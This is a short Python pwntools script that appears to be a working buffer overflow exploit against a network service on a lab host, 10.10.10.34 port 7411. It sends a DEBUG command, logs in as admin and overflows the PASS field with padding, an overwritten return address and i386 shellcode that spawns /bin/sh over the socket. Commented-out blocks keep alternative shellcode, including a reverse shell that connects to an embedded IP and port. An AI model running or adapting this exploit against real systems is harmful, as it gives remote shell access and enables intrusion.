from pwn import *;

context(os='linux',arch='i386')

junk="\xCC"*28;

eip=p32(0xffffd610+32);
#exp="\x31\xc0\x50\x68\x2f\x2f\x73"
#exp+="\x68\x68\x2f\x62\x69\x6e\x89"
#exp+="\xe3\x89\xc1\x89\xc2\xb0\x0b"
#exp+="\xcd\x80\x31\xc0\x40\xcd\x80"

'''exp=""
exp+="\x68"
exp+="\x0A\x0A\x0E\x06"#// <- IP Number "127.0.0.1"
exp+="\x5e\x66\x68"
exp+="\xd9\x03"    # // <- Port Number "55555"
exp+="\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
exp+="\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
exp+="\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
exp+="\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
exp+="\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
exp+="\xeb\xce"
'''

exp="\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
exp+="\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
exp+="\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
exp+="\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
exp+="\x89\xe3\x31\xc9\xcd\x80"

host,port="10.10.10.34",7411
p=remote(host,port)

p.recvuntil("OK Ready. Send USER command.");
                                              
p.sendline("DEBUG");                                                                      
p.recvuntil("OK DEBUG mode on.")                                                        
p.sendline("USER admin")
                                                                
p.recvuntil("OK Send PASS command.")  
p.sendline("PASS "+junk+eip+exp);
p.interactive()
